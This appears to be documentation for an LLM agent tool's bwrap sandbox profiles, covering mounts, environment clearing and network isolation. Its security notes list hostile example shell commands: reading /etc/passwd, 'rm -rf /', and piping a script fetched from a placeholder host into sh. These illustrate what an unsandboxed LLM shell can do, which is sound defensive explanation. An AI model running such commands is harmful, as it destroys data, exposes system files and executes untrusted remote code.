# Extra Sandboxing Notes

Detailed mount tables, environment variables, and design rationale for the two
built-in sandbox profiles. For profile descriptions, comparison, and setup
instructions, see [Sandboxing](sandboxing.md).

## Profile details

### Public Bot

#### Mounts

| Path                                      | Type                  | Purpose                                                   |
| ----------------------------------------- | --------------------- | --------------------------------------------------------- |
| Selected system runtime roots (see below) | `--ro-bind`           | Common system shells, binaries, and libraries (read-only) |
| `/dev`                                    | `--dev`               | Device files (minimal set)                                |
| `/proc`                                   | `--proc`              | Process filesystem                                        |
| `/tmp`                                    | `--tmpfs` or `--bind` | Temporary files; RAM-backed or caller-managed host dir    |
| `/workspace`                              | `--bind`              | Working directory (writable)                              |
| `/home/sandbox`                           | `--bind`              | Synthetic home (writable)                                 |
| `/bin`, `/lib`, `/sbin` (when needed)     | `--symlink`           | Compatibility links into mounted system roots             |

System runtime roots are selected from the following paths when present:

- `/usr/bin`, `/usr/lib`, `/lib64`
- `/run/current-system/sw` ([NixOS])
- `/nix/store`, `/nix/var/nix/profiles/default` ([Nix])

#### Environment

| Variable | Value                                                                                                         |
| -------- | ------------------------------------------------------------------------------------------------------------- |
| `PATH`   | Sanitized system `PATH` derived from the host; excludes home, temp, wrapper, and per-user profile directories |
| `HOME`   | `/home/sandbox`                                                                                               |

#### Network

Disabled (`--unshare-net`).

#### Cache root

Not mounted. A cache root is an optional host directory for storing build
artifacts and other reusable data between sandbox runs. The Public Bot profile
intentionally leaves it out so nothing persists across sessions.

#### Why these mounts

- **System runtime roots**: mounted read-only so the resolved host shell plus
  common distro/[Nix] binaries remain available without exposing the full host
  root.
- **`/dev`, `/proc`, sandbox `/tmp`**: provide the minimum runtime surface for
  common tools.
- **Real home directory hidden**: prevents accidental secret disclosure from
  `~/.ssh` and similar directories.
- **`/etc` omitted**: avoids host-configuration coupling and credential
  exposure (no `/etc/passwd` visible).
- **Inherited env cleared**: prevents credential leakage through environment
  variables.
- **User-specific and volatile roots hidden**: minimizes attack surface and
  information disclosure while still allowing common system binaries.

!!! note "Commands that need extra mounts"

    Commands that rely on paths like `/etc/alternatives`, `/opt`, or per-user
    profile bins may still need explicit extra mounts.

### Trusted Maintenance

#### Mounts

| Path                     | Type                  | Purpose                                               |
| ------------------------ | --------------------- | ----------------------------------------------------- |
| `/`                      | `--ro-bind`           | Entire host `/` (read-only)                           |
| `/home`                  | `--tmpfs`             | Writable overlay (shadows real home)                  |
| `/etc/shadow`            | `--tmpfs`             | Shadowed (prevents password hash exposure)            |
| `/workspace`             | `--bind`              | Working directory (writable)                          |
| `/home/sandbox`          | `--bind`              | Synthetic home (writable)                             |
| `/cache` (if configured) | `--bind`              | Cache root (writable)                                 |
| `/dev`                   | `--dev`               | Device files                                          |
| `/proc`                  | `--proc`              | Process filesystem                                    |
| `/tmp`                   | `--tmpfs` or `--bind` | Temporary files on RAM or caller-managed host storage |

#### Environment

| Variable          | Value                                                      |
| ----------------- | ---------------------------------------------------------- |
| `PATH`            | Sanitized host `PATH` with hidden/volatile entries removed |
| `HOME`            | `/home/sandbox`                                            |
| `TMPDIR`          | `/tmp` (matches the configured sandbox tmp backing)        |
| `XDG_CACHE_HOME`  | `{cache_root}/xdg-cache`                                   |
| `XDG_CONFIG_HOME` | `/home/sandbox/.config`                                    |
| `XDG_STATE_HOME`  | `{cache_root}/xdg-state`                                   |

#### Network

Enabled by default.

#### Why these mounts

- **Read-only host `/`**: keeps existing toolchains usable without rebinding
  every distro-specific path.
- **Writable state narrowed**: synthetic home, workspace, cache root, and
  memory overlays provide necessary write locations without exposing arbitrary
  host paths.
- **`/etc/shadow` shadowed**: password hashes are not exposed even though the
  rest of `/etc` remains visible for compatibility.
- **XDG directories set**: build tools use cache and state directories without
  polluting the synthetic home.

## Under the hood

### Mount types

| Type           | Flag        | Effect                                                         |
| -------------- | ----------- | -------------------------------------------------------------- |
| Read-only bind | `--ro-bind` | Read-only access to a host path                                |
| Writable bind  | `--bind`    | Read-write access to a host path                               |
| Memory overlay | `--tmpfs`   | Writable directory backed by memory; hides anything underneath |
| Symlink        | `--symlink` | Creates a symlink inside the sandbox                           |

### Environment isolation

The sandbox clears all inherited environment variables with `--clearenv`,
then rebuilds the environment using only explicitly allowed variables via
`--setenv`. This prevents secrets that might be in the parent process from
leaking into the sandbox.

### Network isolation

The `--unshare-net` flag removes all network access inside the sandbox by
placing it in its own network namespace with no network interfaces. This is
a kernel-level isolation, not just a firewall rule.

### Process lifecycle

- `--die-with-parent`: the sandboxed process is killed if the parent process
  exits
- `--new-session`: creates a new process session for clean signal handling
- Configurable timeouts with buffered output preservation on kill

### LLM awareness

When the sandbox has network disabled, the system prompt tells the LLM that
network access is unavailable, so it can adjust its behavior accordingly.

## Security notes

### AllowedPathResolver is not a shell sandbox

[`AllowedPathResolver`][apr] only constrains structured file tools
(`read`, `write`, `edit`, `glob`, `grep`). It does **not** make shell
execution safe.

When the `bash` tool is enabled:

- An LLM can run arbitrary shell commands
- Commands can read, write, or delete any file the process has OS-level
  permissions for
- Examples: `cat /etc/passwd`, `rm -rf /`,
  `curl https://example.invalid/install.sh | sh`

If your threat model includes shell execution, use the Linux `bwrap`
sandbox profiles documented here, or disable shell execution entirely.

[apr]: https://docs.rs/reloaded-code-core/latest/reloaded_code_core/struct.AllowedPathResolver.html
[NixOS]: https://nixos.org
[Nix]: https://nixos.org
